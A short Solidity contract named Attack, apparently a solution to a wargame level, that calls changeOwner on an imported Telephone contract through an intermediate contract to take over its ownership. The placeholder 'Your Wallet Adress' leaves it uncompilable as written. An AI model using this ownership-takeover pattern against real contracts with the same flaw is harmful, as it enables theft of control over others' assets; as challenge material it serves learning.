// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Telephone.sol";

contract Attack {

    address public newOwner = Your Wallet Adress;
    
    Telephone public telephoneContract;

    constructor (Telephone telephoneAddresses)public{
        telephoneContract = Telephone(telephoneAddresses);
    }

    function attack() public {
        telephoneContract.changeOwner(newOwner);
  }

}
